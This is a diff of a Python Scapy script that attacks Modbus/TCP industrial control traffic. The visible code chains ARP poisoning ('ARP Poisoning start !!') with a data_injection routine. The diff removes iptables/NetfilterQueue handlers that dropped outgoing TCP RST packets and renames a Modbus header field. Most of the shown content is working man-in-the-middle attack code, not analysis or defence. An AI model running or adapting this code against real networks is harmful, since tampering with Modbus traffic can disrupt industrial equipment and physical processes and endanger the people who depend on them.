@@ -20,7 +20,7 @@ class ModbusTCP(Packet):
     name = "Modbus/TCP"
     fields_desc = [ ShortField("trans_id", 233),
                     ShortField("proto_id", 0),
-                    ShortField("Length", 9),
+                    ShortField("LengthOC", 9),
                     XByteField("uid", 1),
                     ]
 
@@ -154,38 +154,6 @@ def arp_spoofing():
         print("ARP Poisoning start !!")
         sleep(4)
 
-def rst_drop(packet):
-    q = IP(packet.get_payload())
-    print(q[TCP].flags)
-    packet.drop()
-
-
-def rst_cap():
-    QUEUE_NUM = 0
-    os.system("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j NFQUEUE --queue-num 0")
-    queue = NetfilterQueue()
-    try:
-            queue.bind(QUEUE_NUM, rst_drop)
-            queue.run()
-    except KeyboardInterrupt:
-        os.system("iptables --flush && iptables -t nat -F")
-        print("........Exiting......")
-        sleep(3)
-    queue.unbind()
-
-def rstack_cap():
-        QUEUE_NUM = 1
-        os.system("iptables -I OUTPUT -p tcp --tcp-flags RST,ACK RST,ACK -j NFQUEUE --queue-num 1")
-        queue = NetfilterQueue()
-        try:
-                queue.bind(QUEUE_NUM, rst_drop)
-                queue.run()
-        except KeyboardInterrupt:
-                os.system("iptables --flush && iptables -t nat -F")
-                print("........Exiting......")
-                sleep(3)
-        queue.unbind()
-
 def data_injection():
         while True:
                 xx = 1
@@ -218,10 +186,6 @@ def data_injection():
                                 xx = 1
 
 def main():
-        p1 = Process(target=rst_cap)
-        p2 = Process(target=rstack_cap)
-        p1.start()
-        p2.start()
         get_ipmac()
         arp_spoofing()
         data_injection()
@@ -231,3 +195,4 @@ try:
 except IndexError:
     print("Exiting....")
     exit()
+
